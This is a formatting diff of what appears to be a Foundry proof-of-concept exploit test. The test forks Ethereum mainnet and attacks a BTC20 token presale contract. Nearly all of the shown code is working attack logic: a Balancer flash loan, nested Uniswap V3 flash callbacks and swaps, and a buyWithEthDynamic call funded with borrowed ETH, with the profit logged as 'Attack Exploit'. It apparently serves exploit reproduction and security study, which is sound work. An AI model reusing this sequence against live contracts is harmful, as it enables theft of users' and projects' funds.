@@ -28,7 +28,7 @@ contract ContractTest is Test {
     address[] private addrPath = new address[](2);
     uint256 Amount_SDEX_BTC20_Pair3 = 76_301_042_059_171_907_852_637;
     uint256 Amount_BTC20_WETH_Pair3 = 47_676_018_750_296_374_476_872;
-    uint totalBorrowed = 300 ether;
+    uint256 totalBorrowed = 300 ether;
 
     function setUp() public {
         vm.createSelectFork("mainnet", 17_949_215 - 1);
@@ -43,7 +43,7 @@ contract ContractTest is Test {
         approveAll();
     }
 
-    function testExploit() external{
+    function testExploit() external {
         address[] memory tokens = new address[](1);
         tokens[0] = address(WETH);
         uint256[] memory amounts = new uint256[](1);
@@ -51,8 +51,8 @@ contract ContractTest is Test {
         bytes memory userData = "";
         console.log("Before Start: %d ETH", WETH.balanceOf(address(this)));
         Balancer.flashLoan(address(this), tokens, amounts, userData);
-        uint intRes =  WETH.balanceOf(address(this))/1 ether;
-        uint decRes =  WETH.balanceOf(address(this)) - intRes * 1e18;
+        uint256 intRes = WETH.balanceOf(address(this)) / 1 ether;
+        uint256 decRes = WETH.balanceOf(address(this)) - intRes * 1e18;
         console.log("Attack Exploit: %s.%s ETH", intRes, decRes);
     }
 
@@ -71,35 +71,41 @@ contract ContractTest is Test {
 
         (addrPath[0], addrPath[1]) = (address(BTC20), address(WETH));
         Uni_Router_V3.ExactInputSingleParams memory eisParams = Uni_Router_V3.ExactInputSingleParams({
-            tokenIn: address(BTC20), tokenOut: address(SDEX), fee:10_000, recipient: address(this),
-            deadline: type(uint256).max, amountIn: BTC20.balanceOf(address(this)), amountOutMinimum: 0,
-            sqrtPriceLimitX96: 0});
+            tokenIn: address(BTC20),
+            tokenOut: address(SDEX),
+            fee: 10_000,
+            recipient: address(this),
+            deadline: type(uint256).max,
+            amountIn: BTC20.balanceOf(address(this)),
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0
+        });
         uniRouterV3.exactInputSingle(eisParams);
-        (eisParams.tokenIn, eisParams.tokenOut, eisParams.amountIn) = (address(SDEX), address(WETH),
-        SDEX.balanceOf(address(this)));
+        (eisParams.tokenIn, eisParams.tokenOut, eisParams.amountIn) =
+            (address(SDEX), address(WETH), SDEX.balanceOf(address(this)));
         uniRouterV3.exactInputSingle(eisParams);
     }
 
-     function uniswapV3FlashCallback(uint256 _amount0, uint256 _amount1, bytes calldata data) external {
-         uint256 amount = abi.decode(data, (uint256));
+    function uniswapV3FlashCallback(uint256 _amount0, uint256 _amount1, bytes calldata data) external {
+        uint256 amount = abi.decode(data, (uint256));
 
-         if (amount == Amount_SDEX_BTC20_Pair3){
-             BTC20_WETH_Pair3.flash(address(this), 0, Amount_BTC20_WETH_Pair3, abi.encode(Amount_BTC20_WETH_Pair3));
-             (uint amountOut, uint amountInMax) = (amount + amount/100 + 1, WETH.balanceOf(address(this)));
-             (addrPath[0], addrPath[1]) = (address(WETH), address(BTC20));
-             uniRouter.swapTokensForExactTokens(amountOut, amountInMax, addrPath, address(this), type(uint256).max);
-             BTC20.transfer(address(SDEX_BTC20_Pair3), amountOut);
-         }else if(amount == Amount_BTC20_WETH_Pair3){
-             uint amountIn = BTC20.balanceOf(address(this));
-             (addrPath[0], addrPath[1]) = (address(BTC20), address(WETH));
-             uniRouter.swapExactTokensForTokens(amountIn, 0, addrPath, address(this), type(uint256).max);
-             uint buyAmount = PresaleV4.maxTokensToSell()-PresaleV4.directTotalTokensSold();
-             PresaleV4.buyWithEthDynamic{value: totalBorrowed}(buyAmount);
-             (uint amountOut, uint amountInMax) = (amount + amount/100 + 1, WETH.balanceOf(address(this)));
-             (addrPath[0], addrPath[1]) = (address(WETH),address(BTC20));
-             uniRouter.swapTokensForExactTokens(amountOut, amountInMax, addrPath, address(this), type(uint256).max);
-             BTC20.transfer(address(BTC20_WETH_Pair3), amountOut);
-         }
+        if (amount == Amount_SDEX_BTC20_Pair3) {
+            BTC20_WETH_Pair3.flash(address(this), 0, Amount_BTC20_WETH_Pair3, abi.encode(Amount_BTC20_WETH_Pair3));
+            (uint256 amountOut, uint256 amountInMax) = (amount + amount / 100 + 1, WETH.balanceOf(address(this)));
+            (addrPath[0], addrPath[1]) = (address(WETH), address(BTC20));
+            uniRouter.swapTokensForExactTokens(amountOut, amountInMax, addrPath, address(this), type(uint256).max);
+            BTC20.transfer(address(SDEX_BTC20_Pair3), amountOut);
+        } else if (amount == Amount_BTC20_WETH_Pair3) {
+            uint256 amountIn = BTC20.balanceOf(address(this));
+            (addrPath[0], addrPath[1]) = (address(BTC20), address(WETH));
+            uniRouter.swapExactTokensForTokens(amountIn, 0, addrPath, address(this), type(uint256).max);
+            uint256 buyAmount = PresaleV4.maxTokensToSell() - PresaleV4.directTotalTokensSold();
+            PresaleV4.buyWithEthDynamic{value: totalBorrowed}(buyAmount);
+            (uint256 amountOut, uint256 amountInMax) = (amount + amount / 100 + 1, WETH.balanceOf(address(this)));
+            (addrPath[0], addrPath[1]) = (address(WETH), address(BTC20));
+            uniRouter.swapTokensForExactTokens(amountOut, amountInMax, addrPath, address(this), type(uint256).max);
+            BTC20.transfer(address(BTC20_WETH_Pair3), amountOut);
+        }
     }
 
     function approveAll() internal {
@@ -114,7 +120,9 @@ contract ContractTest is Test {
         BTC20.approve(address(PresaleV4), type(uint256).max);
         WETH.approve(address(PresaleV4), type(uint256).max);
     }
-    event Received(address, uint);
+
+    event Received(address, uint256);
+
     receive() external payable {
         emit Received(msg.sender, msg.value);
     }
